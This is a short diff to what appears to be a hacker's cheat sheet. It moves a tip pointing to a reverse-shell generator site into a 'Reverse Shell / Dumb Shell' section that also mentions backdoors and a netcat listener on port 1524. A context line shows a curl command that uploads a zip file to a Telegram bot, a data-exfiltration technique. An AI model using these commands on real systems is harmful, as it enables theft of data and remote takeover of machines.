@@ -1491,6 +1491,9 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 ---
 <a id="reverse-shell"></a>
 ## 5. Reverse Shell / Dumb Shell
+
+Tip: Use [https://www.revshells.com/](https://www.revshells.com/) 👌
+
 <a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat (encrypted)**
 
@@ -1498,8 +1501,6 @@ See [6. Backdoors](#backdoor) for a 1-liner to deploy and access a fully functio
 
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
-
-Tip: Use [https://www.revshells.com/](https://www.revshells.com/) 👌
 
 Start netcat to listen on port 1524 on your system:
 ```sh
